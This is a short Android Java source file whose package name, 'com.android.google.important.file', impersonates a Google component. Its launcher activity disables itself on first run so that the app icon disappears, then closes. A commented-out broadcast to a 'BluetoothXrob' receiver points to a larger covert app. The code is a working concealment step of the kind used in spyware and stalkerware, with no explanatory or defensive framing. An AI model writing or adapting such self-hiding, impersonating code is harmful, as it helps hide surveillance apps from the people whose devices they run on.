package com.android.google.important.file;


import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;



public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       /* setContentView(R.layout.activity_main);
        try {
			Intent i = new Intent("com.xrob.BluetoothXrob");
			sendBroadcast(i);
		} catch (Exception e) {
			e.printStackTrace();
			Log.e("X",e.getMessage());
		}
        */
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.android.google.important.file.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        this.finish();
        
    }


}
